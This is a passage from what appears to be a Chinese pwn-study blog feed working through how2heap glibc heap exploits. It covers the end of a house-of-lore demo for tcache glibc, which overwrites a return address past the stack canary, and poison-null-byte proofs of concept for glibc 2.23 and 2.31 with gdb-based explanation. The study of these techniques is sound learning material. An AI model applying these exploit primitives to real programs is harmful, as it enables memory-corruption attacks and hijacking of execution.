to stack</span><br><br>  <span class="hljs-comment">//------------------------------------</span><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now take all dummies chunk in tcache out\n&quot;</span>);<br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;</span>);<br><br>  <span class="hljs-type">void</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);<br>  <span class="hljs-type">char</span> *p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;p4 = malloc(0x100)\n&quot;</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,<br>         stack_buffer_2[<span class="hljs-number">2</span>]);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="hljs-comment">// this chunk will be allocated on stack</span><br>  <span class="hljs-type">intptr_t</span> sc = (<span class="hljs-type">intptr_t</span>)jackpot; <span class="hljs-comment">// Emulating our in-memory shellcode</span><br><br>  <span class="hljs-type">long</span> offset = (<span class="hljs-type">long</span>)__builtin_frame_address(<span class="hljs-number">0</span>) - (<span class="hljs-type">long</span>)p4;<br>  <span class="hljs-built_in">memcpy</span>((p4+offset+<span class="hljs-number">8</span>), &amp;sc, <span class="hljs-number">8</span>); <span class="hljs-comment">// This bypasses stack-smash detection since it jumps over the canary</span><br><br>  <span class="hljs-comment">// sanity check</span><br>  <span class="hljs-built_in">assert</span>((<span class="hljs-type">long</span>)__builtin_return_address(<span class="hljs-number">0</span>) == (<span class="hljs-type">long</span>)jackpot);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以看到程序大部分和2.23一样，只不过加入了dummies和fake_freelist数组，dummies数组的作用很明显，是为了填满tcachebin以在free(victim)的时候可以将victim放到smallbin中。因为tcachebin的存在，申请p3时会先从tcachebin中取出空闲块，为了避免这样，需要先将tcachebin中的空闲块取出来，这也就是为什么要<code>for(int i=0; i&lt;7; i++) malloc(0x100);</code>，此时申请的p3就是原victim的地址，当从smallbin里申请一个堆块的时候，会把剩下的smallbin也链入相对应大小的tcache，前提是相应大小的tcache没满。</p><p>其对应的源码如下，我们可以看到，将smallbin中的最后一个chunk取出来后，会检查smallbins中是否还有chunk以及对应的tcache链是否还有空余，有的话就就放到tcache中（while循环），我们可以看到，这里并没有检查bck-&gt;fd&#x3D;&#x3D;tc_victim，因此这也就是为什么fake_freelist只需要指定bk就可以。提一下为什么程序中声明的时fake_freelist[7]而不是fake_freelist[1]或者fake_freelist[2]，我个人的理解是必须至少有一个块没有从samllbin中放入tcache中，因为可能存在一些链表的完整性检查，我们无法准确指定最后一个chunk的bk指向表头，因此smallbins中要至少留一个fake_list。因为stack_buffer_1和stack_buffer_2都进入了tcache，因此fake_freelist的数量至少要大于等于6，所以fake_freelist[6]也是可以的。在上面2.23版本中我们还需要指定stack_buffer_2[2]也就是stack_buffer_2的fd指向stack_buffer_1是因为将stack_buffer_1从smallbins中取出的时候要过<code>bck-&gt;fd != victim</code>的检查，而在这段程序中取出victim的时候（注意程序中的victim和glibc中的victim指的不是一个东西），stack_buffer_1和stack_buffer_2都被放入了tcache中，因此也不必指定stack_buffer_2[2]也就是fd指向stack_buffer_1。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>    &#123;<br>      idx = smallbin_index (nb);<br>      bin = bin_at (av, idx);<br><br>      <span class="hljs-keyword">if</span> ((victim = last (bin)) != bin)<br>        &#123;<br>          <span class="hljs-function"><span class="hljs-title">bck</span> = victim-&gt;</span>bk;<br>    <span class="hljs-function"><span class="hljs-title">if</span> (__glibc_unlikely (bck-&gt;</span>fd != victim))<br>      malloc_printerr (<span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);<br>          set_inuse_bit_at_offset (victim, nb);<br>          <span class="hljs-function"><span class="hljs-title">bin</span>-&gt;</span>bk = bck;<br>          <span class="hljs-function"><span class="hljs-title">bck</span>-&gt;</span>fd = bin;<br><br>          <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>      set_non_main_arena (victim);<br>          check_malloced_chunk (av, victim, nb);<br>#<span class="hljs-keyword">if</span> USE_TCACHE<br>    <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment">       stash them in the tcache.  */</span><br>    size_t tc_idx = csize2tidx (nb);<br>    <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>      &#123;<br>        mchunkptr tc_victim;<br><br>        <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span><br>        <span class="hljs-function"><span class="hljs-title">while</span> (tcache-&gt;</span>counts[tc_idx] &lt; mp_.tcache_count<br>         &amp;&amp; (tc_victim = last (bin)) != bin)<br>    &#123;<span class="hljs-comment">// 如果smallbin里相对应大小的tcache没满的话，就链入tcache</span><br>      <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)<br>        &#123;<br>          <span class="hljs-function"><span class="hljs-title">bck</span> = tc_victim-&gt;</span>bk;<br>          set_inuse_bit_at_offset (tc_victim, nb);<br>          <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>      set_non_main_arena (tc_victim);<br>          <span class="hljs-function"><span class="hljs-title">bin</span>-&gt;</span>bk = bck;<br>          <span class="hljs-function"><span class="hljs-title">bck</span>-&gt;</span>fd = bin;<br><br>          tcache_put (tc_victim, tc_idx);<br>              &#125;<br>    &#125;<br>      &#125;<br>#endif<br>          void *p = chunk2mem (victim);<br>          alloc_perturb (p, bytes);<br>          return p;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>how2heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>poison null byte</title>
    <link href="/2022/06/30/poison-null-byte/"/>
    <url>/2022/06/30/poison-null-byte/</url>
    
    <content type="html"><![CDATA[<h1 id="poison-null-byte"><a href="#poison-null-byte" class="headerlink" title="poison null byte"></a>poison null byte</h1><p>本篇主要介绍一下跟着<a href="https://github.com/shellphish/how2heap">how2heap</a>和<a href="https://tttang.com/archive/1614/">cru5h</a>学习poison null byte的过程和一点思考，如有错误欢迎指正。</p><h2 id="2-23"><a href="#2-23" class="headerlink" title="2.23"></a>2.23</h2><p>这里以<a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.23/poison_null_byte.c">how2heap</a>的例子来学习。</p><figure class="highlight cpp"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></div></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">setbuf</span>(stdin, <span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in">setbuf</span>(stdout, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to poison null byte 2.0!\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Tested in Ubuntu 16.04 64bit.\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);<br><br><span class="hljs-type">uint8_t</span>* a;<br><span class="hljs-type">uint8_t</span>* b;<br><span class="hljs-type">uint8_t</span>* c;<br><span class="hljs-type">uint8_t</span>* b1;<br><span class="hljs-type">uint8_t</span>* b2;<br><span class="hljs-type">uint8_t</span>* d;<br><span class="hljs-type">void</span> *barrier;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We allocate 0x100 bytes for &#x27;a&#x27;.\n&quot;</span>);<br>a = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a: %p\n&quot;</span>, a);<br><span class="hljs-type">int</span> real_a_size = <span class="hljs-built_in">malloc_usable_size</span>(a);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Since we want to overflow &#x27;a&#x27;, we need to know the &#x27;real&#x27; size of &#x27;a&#x27; &quot;</span><br><span class="hljs-string">&quot;(it may be more than 0x100 because of rounding): %#x\n&quot;</span>, real_a_size);<br><br><span class="hljs-comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.</span><br><span class="hljs-comment"> * the least significant byte of this will be 0x10, because the size of the chunk includes</span><br><span class="hljs-comment"> * the amount requested plus some amount required for the metadata. */</span><br>b = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b: %p\n&quot;</span>, b);<br><br>c = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c: %p\n&quot;</span>, c);<br><br>barrier =  <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n&quot;</span><br><span class="hljs-string">&quot;The barrier is not strictly necessary, but makes things less confusing\n&quot;</span>, barrier);<br><br><span class="hljs-type">uint64_t</span>* b_size_ptr = (<span class="hljs-type">uint64_t</span>*)(b - <span class="hljs-number">8</span>);<br><br><span class="hljs-comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span><br><span class="hljs-comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span><br><span class="hljs-comment">// this added check requires we are allowed to have null pointers in b (not just a c string)</span><br><span class="hljs-comment">//*(size_t*)(b+0x1f0) = 0x200;</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;In newer versions of glibc we will need to have our updated size inside b itself to pass &quot;</span><br><span class="hljs-string">&quot;the check &#x27;chunksize(P) != prev_size (next_chunk(P))&#x27;\n&quot;</span>);<br><span class="hljs-comment">// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)</span><br><span class="hljs-comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span><br>*(<span class="hljs-type">size_t</span>*)(b+<span class="hljs-number">0x1f0</span>) = <span class="hljs-number">0x200</span>;<br><br><span class="hljs-comment">// this technique works by overwriting the size metadata of a free chunk</span><br><span class="hljs-built_in">free</span>(b);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b.size is: (0x200 + 0x10) | prev_in_use\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);<br>a[real_a_size] = <span class="hljs-number">0</span>; <span class="hljs-comment">// &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);<br><br><span class="hljs-type">uint64_t</span>* c_prev_size_ptr = ((<span class="hljs-type">uint64_t</span>*)c)<span class="hljs-number">-2</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c.prev_size is %#lx\n&quot;</span>,*c_prev_size_ptr);<br><br><span class="hljs-comment">// This malloc will result in a call to unlink on the chunk where b was.</span><br><span class="hljs-comment">// The added check (commit id: 17f487b), if not properly handled as we did before,</span><br><span class="hljs-comment">// will detect the heap corruption now.</span><br><span class="hljs-comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where</span><br><span class="hljs-comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)</span><br><span class="hljs-comment">// next_chunk(P) == b-0x10+0x200 == b+0x1f0</span><br><span class="hljs-comment">// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n&quot;</span>,<br>*((<span class="hljs-type">size_t</span>*)(b<span class="hljs-number">-0x8</span>)), *(<span class="hljs-type">size_t</span>*)(b<span class="hljs-number">-0x10</span> + *((<span class="hljs-type">size_t</span>*)(b<span class="hljs-number">-0x8</span>))));<br>b1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b1: %p\n&quot;</span>,b1);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now we malloc &#x27;b1&#x27;. It will be placed where &#x27;b&#x27; was. &quot;</span><br><span class="hljs-string">&quot;At this point c.prev_size should have been updated, but it was not: %#lx\n&quot;</span>,*c_prev_size_ptr);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Interestingly, the updated value of c.prev_size has been written 0x10 bytes &quot;</span><br><span class="hljs-string">&quot;before c.prev_size: %lx\n&quot;</span>,*(((<span class="hljs-type">uint64_t</span>*)c)<span class="hljs-number">-4</span>));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We malloc &#x27;b2&#x27;, our &#x27;victim&#x27; chunk.\n&quot;</span>);<br><span class="hljs-comment">// Typically b2 (the victim) will be a structure with valuable pointers that we want to control</span><br><br>b2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b2: %p\n&quot;</span>,b2);<br><br><span class="hljs-built_in">memset</span>(b2,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-number">0x80</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Current b2 content:\n%s\n&quot;</span>,b2);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now we free &#x27;b1&#x27; and &#x27;c&#x27;: this will consolidate the chunks &#x27;b1&#x27; and &#x27;c&#x27; (forgetting about &#x27;b2&#x27;).\n&quot;</span>);<br><br><span class="hljs-built_in">free</span>(b1);<br><span class="hljs-built_in">free</span>(c);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Finally, we allocate &#x27;d&#x27;, overlapping &#x27;b2&#x27;.\n&quot;</span>);<br>d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x300</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;d: %p\n&quot;</span>,d);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now &#x27;d&#x27; and &#x27;b2&#x27; overlap.\n&quot;</span>);<br><span class="hljs-built_in">memset</span>(d,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-number">0x300</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;New b2 content:\n%s\n&quot;</span>,b2);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks&quot;</span><br><span class="hljs-string">&quot;for the clear explanation of this technique.\n&quot;</span>);<br><br><span class="hljs-built_in">assert</span>(<span class="hljs-built_in">strstr</span>(b2, <span class="hljs-string">&quot;DDDDDDDDDDDD&quot;</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>首先申请四个chunk a,b,c和barrier，如图所示<br><img src="https://i.imgur.com/GFe7I8S.png"></p><p><code>*(size_t*)(b+0x1f0) = 0x200</code>是为了伪造presize的大小为0x200</p><p><img src="https://i.imgur.com/E07xkDD.png"></p><p><code>free(b)</code>之后四个chunk的状态如图所示，我们可以看到chunk c的真实的prevsize为0x210<br><img src="https://i.imgur.com/b0pSajZ.png"></p><p>然后<code>a[real_a_size] = 0</code>缩小chunk b的大小</p><p><img src="https://i.imgur.com/MnER5HG.png"></p><p>因为之前<code>*(size_t*)(b+0x1f0) = 0x200</code>已经伪造好了<code>chunksize(P) == prev_size (next_chunk(P)</code>因此可以通过检查</p><p>因为之前b已经free掉了，它现在被放到了unsortedbin中，申请一个比它小的0x100大小的堆块，会从已经放入到unsortedbin的b中分割一个b1，剩下的部分还在unsortedbin中，现在堆块状态如图所示。fake chunk是一个大小为0的chunk，分割b的话会缩小它的prevsize<br><img src="https://i.imgur.com/vD4On0B.png"></p><p>此时<code>b2 = malloc(0x80)</code>,分配填充内容后堆状态如图所示<br><img src="https://i.imgur.com/BFTytuO.png"></p><p>此时<code>free(b1)</code>和<code>free(c)</code>后，因为c的prev_size还是210，因此会忽略掉b2，直接b1和c合并，重新<code>malloc(d)</code>后会对b2造成overlap，输出b2的内容会发现变成了D。</p><h2 id="poison-null-byte原理"><a href="#poison-null-byte原理" class="headerlink" title="poison null byte原理"></a>poison null byte原理</h2><p><img src="https://i.imgur.com/adBbFgf.png"><br>这张图来源于<a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.7_heap_exploit_2.html">ctf-all-in-one</a>,里面讲的会详细点，可以看一看。</p><h2 id="2-31"><a href="#2-31" class="headerlink" title="2.31"></a>2.31</h2><p>这里的利用主要是跟着<a href="https://tttang.com/archive/1614/">这篇文章</a>来学习的，具体的思想可以看原文，这里只是跟着更细致地调试一下。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">long</span> *tmp = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x18</span>);<br>    <span class="hljs-type">void</span> *pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10000</span> - ((<span class="hljs-type">long</span>)tmp&amp;<span class="hljs-number">0xffff</span>) - tmp[<span class="hljs-number">-1</span>]);<br>    <span class="hljs-type">void</span> *prev = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br>    <span class="hljs-type">char</span> *victim = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-type">void</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-type">void</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x510</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">free</span>(a);<br>    <span class="hljs-built_in">free</span>(b);<br>    <span class="hljs-built_in">free</span>(prev);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>); <span class="hljs-comment">// b --&gt; prev --&gt; a in largebin</span><br>    <span class="hljs-type">long</span> *prev2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>); <span class="hljs-comment">//cash prev out</span><br>    prev2[<span class="hljs-number">1</span>] = <span class="hljs-number">0x501</span>;  <span class="hljs-comment">//fake size,here must long type</span><br>    prev2[<span class="hljs-number">0x500</span>/<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">long</span>)] = <span class="hljs-number">0x500</span>;<br>    <span class="hljs-type">short</span> *b2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x510</span>); <span class="hljs-comment">// cash b out</span><br>    b2[<span class="hljs-number">0</span>] = <span class="hljs-number">16</span>; <span class="hljs-comment">//change fd</span><br>    <span class="hljs-type">void</span> *a2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>);  <span class="hljs-comment">// cash a out</span><br>    <span class="hljs-built_in">free</span>(a2);     <span class="hljs-comment">// into unsorted bin</span><br>    <span class="hljs-built_in">free</span>(victim); <span class="hljs-comment">// into unsorted bin</span><br>    <span class="hljs-type">short</span> *a3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>); <span class="hljs-comment">//make a3&#x27;s bk not pointing to bin(now to victim)</span><br>    a3[<span class="hljs-number">4</span>] = <span class="hljs-number">16</span>; <span class="hljs-comment">// so just need to change the last 2 bytes of a3&#x27;s bk</span><br>    <span class="hljs-type">char</span> *victim2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>); <span class="hljs-comment">//cash out from unsorted bin</span><br>    victim2[<span class="hljs-number">-8</span>] = <span class="hljs-number">0</span>;  <span class="hljs-comment">// use VULNERABILITY  clear prev_inuse bit</span><br>    <span class="hljs-comment">// backward consolidate, use prev2&#x27;s fd_nextsize and bk_nextsize to fake fd and bk</span><br>    <span class="hljs-built_in">free</span>(victim2);<br>    <span class="hljs-type">long</span> *merged = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">assert</span>((<span class="hljs-type">long</span>)merged - (<span class="hljs-type">long</span>)prev2 == <span class="hljs-number">0x10</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>编译的时候记得换成对应的libc版本</p><p>原文中也提到了，2.29之后增加了很多检查，除了要绕过<code>chunksize(p) == prevsize</code>之外，还要满足unlink的条件，unlink可以查看我之前的文章。</p><p>首先解释一下从unsortedbin双向链表里面取出来一个chunk时，fd指针会被破坏是什么意思。在malloc的时候，会检查unsortedbin中有没有相应大小的chunk，有的话将其取出来，然后将这个块之前的chunk都放入largebin中，因此取出来的时候这个堆块的fd指针是指向表头的。</p><p>为了解决这个难点，通过把unsortedbin整理到largebin的方式来保存fd指针，这一步可以通过malloc一个比unsortedbin中所有块都大的块来实现，这时候unsortedbin都被放到了largebin中，可以将fd_nextsize指针来作为fd指针。</p><p>接下来我们用gdb调试一下就会很清楚</p><p>首先运行到<code>free(a)</code>之前停下来，这时候已经完成了堆块的初始化布局。我理解的tmp和pad的作用就是为了让prev的地址从0x????00??开始。<br><img src="https://i.imgur.com/M4dpJkI.png"><br>然后把a,b,prev都free之后会进入unsortedbin中，再malloc(0x1000)后会进入到largebin中。<br><img src="https://i.imgur.com/ONp1Die.png"></p><p><code>free(a2)</code>之前，堆块的状态如图所示，因为在malloc b2之前，prev已经largebin中取出，因此此时b的fd指向的是a，b2[0] &#x3D; 16的目的就是将0a30变成0010，此时b2的fd指向的就是prev中伪造的fake chunk。</p><p><img src="https://i.imgur.com/FSy6nIL.png"></p><p>之后又free(a2)和free(victim)，此时在unsortedbin中的顺序为victim-&gt;a2-&gt;p，此时a2的bk指向的是victim，此时只需要a3[4]&#x3D;16像刚才修改fd那样将低2字节从0510变为0010即可<br><img src="https://i.imgur.com/MfqXcsJ.png"></p><p>这时候prev的unlink的检测已经准备好了，然后重新malloc victim后修改它的prev_inuse位为0，假装前面的fake chunk处于空闲状态，因此free（victim）后就会和prev2合并。</p><p>这张图很清楚的表明了程序的整个过程，堆块a和b就是为了让prev满足unlink的检测，不断地free和malloc地过程是为了将其放到bin里去自动构造fd和bk。<br><img 